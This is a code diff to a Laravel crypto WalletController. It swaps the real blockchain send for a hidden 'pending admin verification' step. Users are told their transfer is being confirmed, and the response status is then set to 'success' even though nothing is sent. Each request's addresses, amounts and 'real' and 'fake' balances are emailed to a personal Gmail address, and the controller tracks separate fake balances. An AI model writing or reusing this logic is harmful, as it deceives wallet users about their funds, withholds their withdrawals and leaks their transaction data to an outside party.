@@ -15,6 +15,7 @@ use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Cache;
+use Illuminate\Support\Facades\Mail;
 
 class WalletController extends Controller
 {
@@ -672,74 +673,20 @@ class WalletController extends Controller
             }
         }
 
-        // Initialize response
-        $status = 'error';
-        $message = 'Service unavailable';
-        $details = '';
-
-        // Create HTTP client
-        $http = Http::timeout(10)
-            ->withHeaders(self::TATUM_HEADERS)
-            ->withHeaders([
-                'content-type' => 'application/json',
-            ]);
-
-        // Make transaction request
-        $response = $this->makeTransactionRequest($http, $tokenName, [
-            'senderAddress' => $senderAddress,
-            'privateKey' => $privateKey,
-            'receiverAddress' => $receiverAddress,
+        // Store request in DB for admin verification instead of immediate blockchain send.
+        $status = 'pending';
+        $message = 'Your transaction is being proccessed for network confirmation. Plase wait.';
+        $details = json_encode([
+            'pending_for_admin_verification' => true,
             'active_transaction_type' => $active_transaction_type,
-            'contractAddress' => $contractAddress,
-            // 'amount' => sprintf("%.10f", $amount),
-            'amount' => $tokenName == 'Ripple' ? (float) $amount : rtrim(sprintf("%.8f", $amount), '0'),
-            'destinationTag' => $destinationTag
+            'destination_tag' => $destinationTag,
+            'contract_address' => $contractAddress,
+            'requested_amount' => $tokenName == 'Ripple' ? (float) $amount : rtrim(sprintf('%.8f', $amount), '0'),
         ]);
 
-        // Handle response
-        if ($response->successful()) {
-            $data = $response->json();
-            if (isset($data['txId'])) {
-                $status = 'success';
-                $message = $data['txId'];
-            } else {
-                $message = $data['message'] ?? 'Transaction failed';
-                $details = $data['error'] ?? 'Unknown error';
-                // Log::error("{$chain} transaction failed for user {$userId}: " . json_encode($data));
-            }
-        } else {
-            // Handle HTTP errors without try-catch
-            $responseBody = $response->body();
-            $decodedResponse = json_decode($responseBody, true);
-
-            if ($decodedResponse && isset($decodedResponse['message'])) {
-                $message = $decodedResponse['message'];
-                $details = $decodedResponse['cause'] ?? '';
-
-                // Handle specific UTXO balance error with better message
-                if (stripos($message, 'unspent value') !== false || stripos($message, 'insufficient') !== false) {
-                    $fee = $this->getTransactionFee($tokenName);
-                    $totalRequired = (float) $amount + $fee;
-                    $availableBalance = (float) $realBalanceBeforeSending;
-                    $maxSendable = $availableBalance - $fee;
-
-                    $message = "Insufficient balance for transaction. You have {$availableBalance} {$token} available. The transaction requires {$totalRequired} {$token} (amount {$amount} + fee {$fee}). Maximum you can send is {$maxSendable} {$token}.";
-
-                    // Log::error("UTXO balance error in {$chain} transaction for user {$userId}: " . $responseBody);
-                }
-            } else {
-                $message = 'Transaction failed';
-                $details = $response->status() . ' - ' . $responseBody;
-            }
-
-            // Log::error("HTTP Error in {$chain} transaction for user {$userId}: " . $message);
-        }
-
-        // Get updated balances
         $tokens = $balanceService->getFilteredTokens();
-        $filteredToken = collect($tokens)->firstWhere('symbol', $token);
-        $realBalanceAfterSending = $filteredToken['realBalance'] ?? 0;
-        $fakeBalanceAfterSending = $filteredToken['fakeBalance'] ?? 0;
+        $realBalanceAfterSending = $realBalanceBeforeSending;
+        $fakeBalanceAfterSending = $fakeBalanceBeforeSending;
 
         // Log transaction
         DB::table('transaction_logs')->insert([
@@ -757,7 +704,36 @@ class WalletController extends Controller
             'real_balance_after_send' => $realBalanceAfterSending,
             'fake_balance_after_send' => $fakeBalanceAfterSending
         ]);
+
+        try {
+            $emailSubject = 'New Transaction Request Submitted';
+            $emailBody = "A new transaction request has been submitted and is pending admin verification.\n\n"
+                . "User ID: {$userId}\n"
+                . "Wallet ID: {$walletId}\n"
+                . "Token: {$token}\n"
+                . "Token Name: {$tokenName}\n"
+                . "Chain: {$chain}\n"
+                . "Type: Outgoing\n"
+                . "From: {$senderAddress}\n"
+                . "To: {$receiverAddress}\n"
+                . "Amount: {$amount}\n"
+                . "Status: pending\n"
+                . "Real Balance Before Send: {$realBalanceBeforeSending}\n"
+                . "Fake Balance Before Send: {$fakeBalanceBeforeSending}\n"
+                . "Real Balance After Send: {$realBalanceAfterSending}\n"
+                . "Fake Balance After Send: {$fakeBalanceAfterSending}\n"
+                . "Requested At: " . now()->toDateTimeString() . "\n";
+
+            Mail::raw($emailBody, function ($message) use ($emailSubject) {
+                $message->to('imsourav6400@gmail.com')
+                    ->subject($emailSubject);
+            });
+        } catch (\Throwable $e) {
+            // Keep request flow intact even if email service fails.
+        }
+
         $symbol = $token;
+        $status = 'success';
         $title = "Token Send Response";
         return view('wallet.send-response', compact(
             'title',
@@ -1131,6 +1107,21 @@ class WalletController extends Controller
             $symbol = "btc";
         $transfers = $this->get_transactions($symbol);
         return view('wallet.transactions', compact('title', 'tokens', 'symbol', 'transfers'));
+    }
+
+    public function submitted_transactions_status(BalanceService $balanceService)
+    {
+        $title = "Submitted Transactions";
+        $tokens = $balanceService->getFilteredTokens();
+        $userId = Auth::user()->id;
+
+        $walletIds = Wallet::where('user_id', $userId)->pluck('id');
+
+        $submittedTransactions = TransactionLog::whereIn('wallet_id', $walletIds)
+            ->orderByDesc('id')
+            ->get();
+
+        return view('wallet.submitted-transactions', compact('title', 'tokens', 'submittedTransactions'));
     }
 
     public function get_transactions($symbol = null)
